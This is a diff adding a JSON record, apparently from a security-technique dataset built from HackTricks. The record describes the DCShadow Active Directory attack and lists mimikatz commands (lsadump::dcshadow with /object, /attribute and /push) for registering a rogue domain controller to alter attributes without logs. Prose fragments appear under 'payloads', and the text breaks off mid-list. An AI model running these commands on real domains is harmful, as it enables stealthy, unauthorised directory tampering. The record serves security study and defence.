@@ -1,0 +1,27 @@
+{
+  "id": "windows_hardening_ffc40ef1bcb9",
+  "category": "windows-hardening",
+  "title": "dcshadow",
+  "description": "# DCShadow\n\n{{#include ../../banners/hacktricks-training.md}}\n\n\n## Basic Information\n\nIt registers a **new Domain Controller** in the AD and uses it to **push attributes** (SIDHistory, SPNs...) on specified objects **without** leaving any **logs** regarding the **modifications**. You **need DA** privileges and be inside the **root domain**.\\\nNote that if you use wrong data, pretty ugly logs will appear.\n\nTo perform the attack you need 2 mimikatz instances. One of them will start the RPC servers ",
+  "payloads": [
+    "# DCShadow",
+    "{{#include ../../banners/hacktricks-training.md}}",
+    "## Basic Information",
+    "It registers a **new Domain Controller** in the AD and uses it to **push attributes** (SIDHistory, SPNs...) on specified objects **without** leaving any **logs** regarding the **modifications**. You **need DA** privileges and be inside the **root domain**.\\",
+    "Note that if you use wrong data, pretty ugly logs will appear.",
+    "To perform the attack you need 2 mimikatz instances. One of them will start the RPC servers with SYSTEM privileges (you have to indicate here the changes you want to perform), and the other instance will be used to push the values:",
+    "```bash:mimikatz1 (RPC servers)",
+    "!processtoken",
+    "lsadump::dcshadow /object:username /attribute:Description /value=\"My new description\"",
+    "```bash:mimikatz2 (push) - Needs DA or similar",
+    "lsadump::dcshadow /push",
+    "Notice that **`elevate::token`** won't work in `mimikatz1` session as that elevated the privileges of the thread, but we need to elevate the **privilege of the process**.\\",
+    "You can also select and \"LDAP\" object: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`",
+    "You can push the changes from a DA or from a user with this minimal permissions:",
+    "- In the **domain object**:"
+  ],
+  "source": "HackTricks",
+  "references": [
+    "/workspaces/hunter-skill/hacktricks/src/windows-hardening/active-directory-methodology/dcshadow.md"
+  ]
+}
